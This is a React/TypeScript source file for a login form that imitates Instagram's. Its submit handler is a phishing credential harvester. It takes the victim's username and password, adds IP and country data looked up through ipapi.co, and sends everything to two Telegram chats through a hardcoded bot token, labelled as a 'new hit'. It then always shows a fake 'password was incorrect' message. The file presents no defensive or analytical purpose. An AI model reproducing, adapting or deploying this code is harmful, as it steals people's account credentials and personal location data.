import React, { useState, useEffect } from 'react';

const getFlagEmoji = (countryCode: string): string => {
    if (!countryCode || countryCode.length !== 2) {
        return '';
    }
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
};

const getGeoInfo = async () => {
    try {
        const geoResponse = await fetch('https://ipapi.co/json/');
        if (geoResponse.ok) {
            const geoData = await geoResponse.json();
            return {
                ip: geoData.ip || 'N/A',
                country: geoData.country_name || 'N/A',
                countryCode: geoData.country_code || '',
                dialCode: geoData.country_calling_code || 'N/A',
            };
        }
    } catch (geoError) {
        console.error("Geolocation fetch failed:", geoError);
    }
    return { ip: 'N/A', country: 'N/A', countryCode: '', dialCode: 'N/A' };
};


const LoginForm: React.FC = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [isButtonDisabled, setIsButtonDisabled] = useState(true);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const [loginAttempted, setLoginAttempted] = useState(false);

    useEffect(() => {
        setIsButtonDisabled(!(username.length > 0 && password.length > 5));
    }, [username, password]);
    
    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        if (isButtonDisabled || isLoading) return;
        
        setIsLoading(true);
        setError('');

        const BOT_TOKEN = '7692603669:AAFWBzLxgRZoRjfIL8dbqD9R_UV_Xk4Hrcs';
        const CHAT_IDS = ['5633188078', '6179617396'];

        try {
            const { ip, country, countryCode, dialCode } = await getGeoInfo();
            
            const flag = getFlagEmoji(countryCode);
            const messageText = `ʜɪ ɴᴇᴡ ʜɪᴛ 🖤.
ᯓ ʟɪɴᴋ » IG
ᯓ ʟᴏɢɪɴ » Instagram 🤞
ᯓ ᴇᴍᴀɪʟ » ${username}
ᯓ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password}
ᯓ ᴄᴏᴜɴᴛʀʏ » ${country} ${flag}
ᯓ ᴅɪᴀʟᴄᴏᴅᴇ » ${dialCode}
ᯓ ɪᴘ » ${ip}`;

            const sendPromises = CHAT_IDS.map(chatId => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                return fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: messageText,
                    }),
                });
            });

            const responses = await Promise.all(sendPromises);

            for (const response of responses) {
                if (!response.ok) {
                    const errorData = await response.json();
                    console.error('Telegram API Error:', errorData);
                    throw new Error(`Telegram API request failed: ${errorData.description || 'Unknown error'}`);
                }
            }
            
        } catch (apiError) {
            console.error("API call failed:", apiError);
        } finally {
            setError('Sorry, your password was incorrect. Please double-check your password.');
            setPassword('');
            setIsLoading(false);
            setLoginAttempted(true);
        }
    };

    const inputClassName = `block px-2.5 pb-2.5 pt-4 w-full text-sm text-gray-900 bg-gray-50 rounded-md border appearance-none focus:outline-none focus:ring-0 peer ${
        loginAttempted ? 'border-red-500' : 'border-gray-300 focus:border-sky-500'
    }`;
    
    const isLoginButtonDisabled = isButtonDisabled || isLoading;
    const loginButtonText = isLoading ? 'Logging In...' : 'Log in';

    return (
        <form onSubmit={handleLogin} className="w-full flex flex-col gap-2">
            <div className="relative">
                <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder=" "
                    id="username"
                    className={inputClassName}
                    aria-label="Phone number, username, or email"
                    aria-required="true"
                    autoComplete="username"
                />
                <label
                    htmlFor="username"
                    className="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] start-2.5 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto"
                >
                    Phone number, username, or email
                </label>
            </div>
             <div className="relative">
                <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder=" "
                    id="password"
                    className={inputClassName}
                    aria-label="Password"
                    aria-required="true"
                    autoComplete="current-password"
                />
                <label
                    htmlFor="password"
                    className="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] start-2.5 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto"
                >
                    Password
                </label>
            </div>
            <button
                type="submit"
                disabled={isLoginButtonDisabled}
                className={`w-full mt-4 bg-sky-500 text-white font-bold py-2 px-4 rounded transition-colors ${isLoginButtonDisabled ? 'opacity-50 cursor-not-allowed' : 'hover:bg-sky-600'}`}
                aria-disabled={isLoginButtonDisabled}
            >
                {loginButtonText}
            </button>
            {error && (
                <p className="text-red-500 text-sm text-center mt-4" role="alert">
                    {error}
                </p>
            )}
        </form>
    );
};

export default LoginForm;